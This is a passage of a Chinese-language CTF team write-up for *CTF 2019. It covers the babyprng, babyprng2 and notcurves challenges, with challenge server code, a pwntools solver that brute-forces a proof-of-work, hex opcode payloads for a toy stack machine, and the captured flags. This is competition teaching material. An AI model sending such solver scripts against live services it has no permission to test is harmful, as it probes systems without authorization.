class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        signal.alarm(<span class="number">3</span>)</span><br><span class="line">        self.dosend(<span class="string">"opcode(hex): "</span>)</span><br><span class="line">        code = self.recvhex(<span class="number">400</span>)</span><br><span class="line">        out = self.run(code)</span><br><span class="line">        <span class="keyword">print</span> len(out)</span><br><span class="line">        <span class="keyword">if</span> len(out) &gt; int(self.SIZE*<span class="number">0.9</span>):</span><br><span class="line">            one = float(len(filter(<span class="keyword">lambda</span> x:x==<span class="number">1</span>,out)))/len(out)</span><br><span class="line">            <span class="keyword">print</span> one</span><br><span class="line">            <span class="keyword">if</span> abs(one<span class="number">-0.5</span>)&lt;self.DELTA:</span><br><span class="line">                self.dosend(<span class="string">"%s\n"</span> % FLAG)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.dosend(<span class="string">"&gt;.&lt;\n"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.dosend(<span class="string">"&gt;.&lt;\n"</span>)</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkingServer</span><span class="params">(SocketServer.ForkingTCPServer, SocketServer.TCPServer)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    HOST, PORT = <span class="string">'0.0.0.0'</span>, <span class="number">10002</span></span><br><span class="line">    <span class="keyword">print</span> HOST</span><br><span class="line">    <span class="keyword">print</span> PORT</span><br><span class="line">    server = ForkingServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="keyword">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
<p> 就是个调整概率的游戏，把1的占有率调到%49.5 — %50.5就win</p>
<p>首先随机生成10万个01装进stack<br>再进行100万次操作，使得最后的stack中1的占比在%49.5 — %50.5 to win<br>利用其他操作 包括跳转和&amp;|^构造精确的所需要的stack内容<br>脚本如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">target = remote(<span class="string">"34.92.185.118"</span>, <span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">"sha256(XXXX+"</span>)</span><br><span class="line">salt = target.recv(<span class="number">16</span>)</span><br><span class="line">target.recvuntil(<span class="string">") == "</span>)</span><br><span class="line">digest = target.recv(<span class="number">64</span>)</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha256</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = hashlib.sha256(s).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">''</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">4</span>)])</span><br><span class="line">    <span class="keyword">if</span> sha256(s + salt) == digest:</span><br><span class="line">        result = s</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">target.recvuntil(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line">target.sendline(result)</span><br><span class="line">target.recvuntil(<span class="string">"opcode(hex): "</span>)</span><br><span class="line">payload = <span class="string">"\x02\x04\x01\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x03\x01\x11\x35\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50"</span></span><br><span class="line">payload = payload.encode(<span class="string">"hex"</span>)</span><br><span class="line">target.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> target.recv()</span><br><span class="line">target.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>*ctf{23bb9d2dc5eebadb04ea0f9cfbc1043f}</p>
</blockquote>
<h3 id="babyprng2"><a href="#babyprng2" class="headerlink" title="babyprng2"></a>babyprng2</h3><p>类似上一题，不过这一题append进out之后会del掉，所以不好控制输出相同数量的0和1<br>最后的想法是先用或运算增加1的数量，然后将1和0分别放进sequence的前面和后面，反序输入回stack后再输出到out，通过无效的操作消耗100W次操作上限，将1输出完之后将0的输出控制在跟1差不多的数量，因为随机数多所以无法保证每一次都能控制的刚好 -_- ，最后写出来的脚本也只是有可能 getflag(可能欧皇一次就通了)，脚本如上题，修改payload和端口即可：<br>payload = “\x03\x03\x01\x12\x06\x11\x05\x07\x11\x3a\x08\x03\x11\x33\x03\x03\x03\x00\x36”</p>
<blockquote>
<p>*ctf{e48af588d4b80ade5ad44a8b5c90d222}</p>
</blockquote>
<h3 id="notcurves"><a href="#notcurves" class="headerlink" title="notcurves"></a>notcurves</h3><p>非预期解…因为捕获异常会置0，而且0%p==0，所以直接整个不符合格式的point就可以了</p>
<blockquote>
<p>*ctf{2ca55eb39e6fd9e5f1e7396b5c24a352}</p>
</blockquote>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/ctf/">#ctf</a> <a href="/tags/re/">#re</a> <a href="/tags/web/">#web</a> <a href="/tags/crypto/">#crypto</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/misc/">#misc</a> <a href="/tags/writeup/">#writeup</a> <a href="/tags/ctf/">#\*ctf</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    De1ta-Team: De1iver the tea
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2099/05/22/Write-ups-for-CTFs/">Write ups for CTFs</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/06/24/sctf2019/">SCTF 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/05/21/RCTF-De1ta/">RCTF 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/04/30/*CTF 2019 Writeup/">\*CTF 2019 Writeup</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/De1ta-team">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @De1ta-Team. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>